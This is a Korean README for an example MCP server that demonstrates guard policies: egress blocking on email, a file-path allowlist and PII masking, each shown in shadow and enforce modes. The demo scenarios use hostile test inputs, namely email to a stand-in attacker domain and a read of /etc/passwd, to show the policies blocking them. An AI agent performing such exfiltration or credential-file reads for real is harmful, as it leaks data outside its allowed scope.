# ARS MCP 예제 서버

[English](./README.md) | [한국어](./README.ko.md)

Guard 정책이 적용된 MCP 서버 데모입니다. 3개 도구로 핵심 정책을 보여줍니다.

## 도구

| 도구 | 데모 포인트 |
|------|------------|
| `send_email` | 외부 도메인 egress 차단 |
| `read_file` | 파일 경로 제한 |
| `search` | 결과 PII 자동 마스킹 |

## 실행

```bash
# MCP Inspector로 실행
mcp dev examples/mcp_server.py

# 또는 직접 실행
python examples/mcp_server.py
```

## 데모 시나리오

### 1. Shadow 모드 (기본)

`policy.yaml`의 `mode: shadow` 상태에서 실행합니다.

```text
send_email(to="attacker@evil.com", subject="test", body="hello")
-> 실행 허용, audit에 original_action=block 기록

read_file(path="/etc/passwd")
-> 실행 허용, audit에 original_action=block 기록

search(query="admin")
-> 결과의 PII가 마스킹됨 (shadow에서도 데이터 보호는 항상 강제)
```

### 2. Enforce 모드

`policy.yaml`에서 `mode: enforce`로 변경 후 재실행합니다.

```text
send_email(to="attacker@evil.com", subject="test", body="hello")
-> 차단: "Tool 'send_email' blocked by policy 'egress_control'"

send_email(to="user@internal.com", subject="test", body="hello")
-> 허용 (allowlist 도메인)

read_file(path="/etc/passwd")
-> 차단: "Tool 'read_file' blocked by policy 'file_path_allowlist'"

read_file(path="/tmp/safe/data.txt")
-> 허용 (allowlist 경로)

search(query="admin")
-> 결과의 PII가 마스킹됨
```

## 정책 파일

`policy.yaml`을 수정하면 코드 변경 없이 정책을 바꿀 수 있습니다.
